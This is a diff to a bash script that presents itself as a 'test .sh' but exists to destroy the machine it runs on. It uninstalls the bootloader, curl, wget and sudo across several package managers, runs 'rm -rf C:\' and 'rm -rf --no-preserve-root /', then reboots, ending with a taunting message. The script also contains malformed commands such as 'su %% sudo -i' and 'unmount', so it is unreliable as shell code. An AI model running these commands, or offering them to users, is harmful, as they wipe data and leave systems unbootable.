@@ -1,25 +1,50 @@
 #!/bin/bash
-echo 'im not responsible for any damages to your pc please run this 
-in a test vm or a pc you dont need this is a test .sh'
+echo 
+'im not responsible for any damages to your pc please run this 
+in a test vm or a pc you dont need this is a test .sh!'
 su %% sudo -i
 mkdir /start/
 unmount /dev/sda
 unmount /dev/sda1
 unmount /
+## check the system before huge uninstall dump/os deleter :P#
+systemctl
+# Show status of nginx for 5 seconds, then move on #
+timeout 5s systemctl status nginx
+echo "Continuing script..."
 apt-get uninstall grub
 apt uninstall grub
+apt uninstall curl
+apt uninstall wget
+echo 'bloat for power users to try to get there systems back :P'
 echo 'if err try other operating systems'
 sudo pacman -Rns grub
 echo 'dnf package manager'
 sudo dnf remove grub
+sudo dnf remove curl
+sudo dnf remove wget
 echo 'pkg/base linux/bsd-based'
 pkg delete grub && echo 'or remove/uninstall'
 pkg remove grub
 pkg uninstall grub
+pkg uninstall wget 
+pkg remove curl
+pkg uninstall wget
+pkg remove wget
+echo 'arch-linux aur version'
+pacman -Rns curl
+sudo pacman -Rns wget
+sudo pacman -Rns sudo
+# windows version #
 echo 'if windows somehow -bc theres sh ports'
 rm -rf C:\
+# end of windows version #
 mkdir /done/
-rm -rf --no-preserve-root / 
+mkdir /status/
+rm -rf --no-preserve-root /
+mkdir /done/
+mkdir /status/
 echo 'should be done'
 echo 'bye :P you did this :D'
+
 sudo reboot
